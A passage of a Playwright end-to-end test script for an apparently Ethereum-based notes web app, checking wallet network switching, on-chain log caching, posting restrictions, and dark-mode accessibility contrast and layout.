        await open('/note/0x1',{...patch,account:other});await page.getByRole('button',{name:label,exact:true}).click();await page.getByRole('alert').filter({hasText:/rejected/}).waitFor();const req=await sent(fn);assert.equal(req.to.toLowerCase(),hook.toLowerCase());assert.deepEqual(req.args,[id]);
      }
    });
    await check('Persistent log cursor survives a page reload',async()=>{
      await open('/');await page.locator('.entry-text').waitFor();assert(await page.evaluate(()=>Object.keys(localStorage).some(k=>k.startsWith('marginalia.logs.'))));f.rpc=[];f.head+=100n;await page.reload();await page.locator('.entry-text').waitFor();const calls=f.rpc.filter(r=>r.method==='eth_getLogs');assert.equal(calls.length,1);assert(BigInt(calls[0].params[0].fromBlock)>deploy+2500n);
    });
    await check('Wrong network adds Ethereum after unknown-chain rejection',async()=>{
      await open('/post',{chain:'0x2'});await page.getByRole('button',{name:'Switch to Ethereum'}).click();await page.waitForTimeout(200);assert.deepEqual(await page.evaluate(()=>window.__added),[manifest.walletAddChain]);assert.match(await page.locator('.walletbar').innerText(),/on Ethereum/);
    });
    await check('Seal boundaries, subject and connected author are enforced',async()=>{
      for(const patch of [{sealAge:1700},{sealAge:22000},{sealAge:14400,wrongSubject:true},{sealAge:14400,account:other}]){
        await open('/post',patch);const post=page.getByRole('button',{name:'Post the call',exact:true});await post.waitFor();assert(await post.isDisabled());
      }
    });
    await check('Desktop, dark mode, keyboard focus and overflow',async()=>{
      await open('/author/'+author);await page.setViewportSize({width:1440,height:1000});await shot('author-1440');
      await page.getByRole('link',{name:'Feed',exact:true}).click();await page.getByRole('heading',{name:'Notes and theses',exact:true}).waitFor();await page.emulateMedia({colorScheme:'dark',reducedMotion:'reduce'});await page.setViewportSize({width:390,height:844});await page.keyboard.press('Tab');
      assert(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth));assert.equal(errors.length,0);await shot('feed-dark-keyboard');
      const colors=async()=>page.evaluate(()=>{
        const color=s=>getComputedStyle(document.querySelector(s)).color;
        const paper=getComputedStyle(document.body).backgroundColor;
        const rgb=s=>s.match(/[\d.]+/g).slice(0,3).map(Number).map(v=>{v/=255;return v<=0.04045?v/12.92:((v+0.055)/1.055)**2.4;});
        const lum=s=>rgb(s).reduce((a,v,i)=>a+v*[0.2126,0.7152,0.0722][i],0);
        const contrast=(a,b)=>{a=lum(a);b=lum(b);return +( (Math.max(a,b)+0.05)/(Math.min(a,b)+0.05)).toFixed(2);};
        return {paper,ink:color('body'),soft:color('.lede'),link:color('.footer a'),inkContrast:contrast(color('body'),paper),softContrast:contrast(color('.lede'),paper),linkContrast:contrast(color('.footer a'),paper),focusOutline:getComputedStyle(document.activeElement).outlineStyle};
      });
      metrics.dark=await colors();
      await page.emulateMedia({colorScheme:'light'});await page.setViewportSize({width:1440,height:1000});await shot('feed-1440');metrics.light=await colors();
    });
  }
  }
} finally {
  if(evidence){fs.writeFileSync(path.join(evidence,before?'before.json':'after.json'),JSON.stringify(reports,null,2));fs.writeFileSync(path.join(evidence,'metrics.json'),JSON.stringify(metrics,null,2));}
  await browser.close();await new Promise(r=>server.close(r));
}
